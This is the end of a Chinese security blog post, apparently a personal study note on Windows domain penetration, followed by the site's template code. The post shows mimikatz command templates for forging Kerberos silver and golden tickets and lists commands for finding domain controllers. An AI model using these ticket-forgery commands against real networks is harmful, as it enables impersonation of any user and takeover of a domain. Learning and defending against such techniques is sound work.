+<p>具体原理请移步<br><a href="https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works</a></p>
+<p>这里搜录一个比较牛的一直在更新的github项目——UACME,找时间一定好好学习下这些思路<br><a href="https://github.com/hfiref0x/UACME" target="_blank" rel="noopener">https://github.com/hfiref0x/UACME</a></p>
+</blockquote>
+<h1 id="域环境票据伪造"><a href="#域环境票据伪造" class="headerlink" title="域环境票据伪造"></a>域环境票据伪造</h1><blockquote>
+<p>这篇文章对windows的认证将得很透<br><a href="http://www.yilan.io/article/5c343fe549205a2c276e3381" target="_blank" rel="noopener">http://www.yilan.io/article/5c343fe549205a2c276e3381</a></p>
+</blockquote>
+<p>既然知道了上述windows认证的协议细节，我们可以明白，获取特定服务主机的hash后我们可以构造白银票据；知道了kerberos用户的hash,我们就可以构造任何服务的黄金票据。构造的相关过程，上述链接里面也有了介绍。这里把关键的密令步骤摘录如下（具体的细节，请移步mimikatz官方wiki：<a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos）：" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos）：</a></p>
+<h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器主机名&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLM Hash&gt; /user:&lt;用户名&gt; /ptt&quot; exit</span><br></pre></td></tr></table></figure>
+<h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz “kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域SID&gt; /rc4:&lt;KRBTGT NTLM Hash&gt; /user:&lt;任意用户名&gt; /ptt&quot; exit</span><br></pre></td></tr></table></figure>
+<p>上述命令执行完毕会直接在当前会话注入票据（相当于直接集成了kerberos::ptt命令）。当然最后的<code>/ppt</code>换成<code>/ticket</code>后接输出文件名可以把票据直接保存到文件，而不是直接注入当前会话。</p>
+<h1 id="如何找域控"><a href="#如何找域控" class="headerlink" title="如何找域控"></a>如何找域控</h1><ul>
+<li>查找内网DNS</li>
+<li>扫描获取开放端口为389机器</li>
+<li>使用NLTEST命令查看</li>
+<li><p>运用<code>net</code>命令或者其他类似工具查找域控</p>
+</li>
+<li><p>以下命令可以带来帮助</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1.net view</span><br><span class="line">net view /domain</span><br><span class="line">2.set log</span><br><span class="line">set log</span><br><span class="line">3.通过srv记录</span><br><span class="line">nslookup -type=SRV _ldap._tcp.corp</span><br><span class="line">4.使用nltest</span><br><span class="line">nltest /dclist:corp</span><br><span class="line">5.使用dsquery</span><br><span class="line">DsQuery Server -domain corp</span><br><span class="line">6.使用netdom</span><br><span class="line">netdom query pdc</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>[1] <a href="https://evi1cg.me/archives/Powershell_Bypass_UAC.html" target="_blank" rel="noopener">PS Bypass UAC</a><br>[2] <a href="https://www.freebuf.com/articles/web/176796.html" target="_blank" rel="noopener">九种姿势运行Mimikatz</a><br>[3] <a href="https://www.freebuf.com/articles/system/155147.html" target="_blank" rel="noopener">powershell 远程下载</a><br>[4] <a href="http://www.4hou.com/system/13707.html" target="_blank" rel="noopener">msf 五种方式绕过UAC</a><br>[5] <a href="http://www.fuzzysecurity.com/tutorials/27.html" target="_blank" rel="noopener">Anatomy of UAC Attacks</a><br>[6] <a href="https://wooyun.js.org/drops/Powershell%20%E6%8F%90%E6%9D%83%E6%A1%86%E6%9E%B6-Powerup.html" target="_blank" rel="noopener">Powershell提权框架</a><br>[7] <a href="http://www.5ecurity.cn/index.php/archives/227/" target="_blank" rel="noopener">内网剑客三结义</a><br>[8] <a href="https://github.com/l3m0n/pentest_study" target="_blank" rel="noopener">从零开始内网渗透学习</a><br>[9] <a href="https://www.anquanke.com/post/id/92646" target="_blank" rel="noopener">我所了解的内网渗透——内网渗透知识大总结</a><br>[10] <a href="https://xz.aliyun.com/t/237/" target="_blank" rel="noopener">域渗透基础简单信息收集</a><br>[11] <a href="http://b404.xyz/2017/12/30/exploit-domain/" target="_blank" rel="noopener">域渗透的整理</a><br>[12] <a href="https://www.anquanke.com/post/id/92646" target="_blank" rel="noopener">我所了解的内网渗透——内网渗透知识大总结</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+	<div>
+      
+      <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+	  
+	</div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文标题:</strong>
+    <a href="/2019/01/25/域渗透（一）/">域渗透（一）</a>
+  </li>
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    1ypt0
+  </li>
+  <li class="post-copyright-author">
+    <strong>发布时间:</strong>
+    2019年01月25日 - 00:01
+  </li>
+  <li class="post-copyright-author">
+    <strong>最后更新:</strong>
+    2019年01月25日 - 00:01
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://lypto.me/2019/01/25/域渗透（一）/" title="域渗透（一）">http://lypto.me/2019/01/25/域渗透（一）/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web/" rel="tag"># web</a>
+          
+            <a href="/tags/域渗透/" rel="tag"># 域渗透</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/12/28/数模之插值与拟合/" rel="next" title="数模之插值与拟合">
+                <i class="fa fa-chevron-left"></i> 数模之插值与拟合
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/uploads/109.jpg" alt="1ypt0">
+          <p class="site-author-name" itemprop="name">1ypt0</p>
+           
+              <p class="site-description motion-element" itemprop="description">Please remember that. The Titanic was not supposed to sink, but it did.</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">42</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">19</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">41</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=857896&auto=0&height=66"></iframe>
+
+<div align="left" font-family:="" "arial","microsoft="" yahei","����","����",sans-serif="">
+
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/IversionBY" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="mailto:mini.lypto@gmail.com" target="_blank" title="GMail">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  GMail
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/littelpotato" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.xdsec.club/" title="XDSEC" target="_blank">XDSEC</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://cesslab.club/#/" title="cesslab" target="_blank">cesslab</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://firmianay.github.io/" title="超哥" target="_blank">超哥</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://nen9ma0.github.io/" title="大能猫" target="_blank">大能猫</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://dimo233.github.io/" title="去师" target="_blank">去师</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.k0rz3n.com" title="天师" target="_blank">天师</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://notwo1f.github.io/" title="武师" target="_blank">武师</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://1phan.cc/" title="1phan" target="_blank">1phan</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.sky3.pw/" title="sky" target="_blank">sky</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://lookupes.com/" title="lookup" target="_blank">lookup</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://herbwen.com/" title="文师" target="_blank">文师</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </div></section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DOS搜集"><span class="nav-number">1.</span> <span class="nav-text">DOS搜集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#dsquery-查询"><span class="nav-number">2.</span> <span class="nav-text">dsquery 查询</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#运用powerview"><span class="nav-number">3.</span> <span class="nav-text">运用powerview</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Meterpreter"><span class="nav-number">4.</span> <span class="nav-text">Meterpreter</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#密码hash文件"><span class="nav-number">5.</span> <span class="nav-text">密码hash文件</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SAM密码文件extract"><span class="nav-number">5.1.</span> <span class="nav-text">SAM密码文件extract</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NTDS-DIT-extract"><span class="nav-number">5.2.</span> <span class="nav-text">NTDS.DIT extract</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mimikatz-module-lsadump"><span class="nav-number">5.3.</span> <span class="nav-text">mimikatz module~lsadump</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mimikatz无文件导hash"><span class="nav-number">5.4.</span> <span class="nav-text">mimikatz无文件导hash</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Bypass-UAC"><span class="nav-number">6.</span> <span class="nav-text">Bypass UAC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#域环境票据伪造"><span class="nav-number">7.</span> <span class="nav-text">域环境票据伪造</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#白银票据"><span class="nav-number">7.1.</span> <span class="nav-text">白银票据</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#黄金票据"><span class="nav-number">7.2.</span> <span class="nav-text">黄金票据</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#如何找域控"><span class="nav-number">8.</span> <span class="nav-text">如何找域控</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">9.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy;  2017 - 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">1ypt0</span>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.3/jquery.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/velocity/1.3.1/velocity.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/velocity/1.3.1/velocity.ui.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://iversion lee.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://lypto.me/2019/01/25/域渗透（一）/';
+          this.page.identifier = '2019/01/25/域渗透（一）/';
+          this.page.title = '域渗透（一）';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://iversion lee.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+    
+    <script>
+      var cloudTieConfig = {
+        url: document.location.href, 
+        sourceId: "",
+        productKey: "a1fe7273de6e47ad9f9802a493c2cccf",
+        target: "cloud-tie-wrapper"
+      };
+    </script>
+    <script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (search_path.endsWith("json")) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+  
+
+
+  
+
+  
+
+</div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end --></body></html>
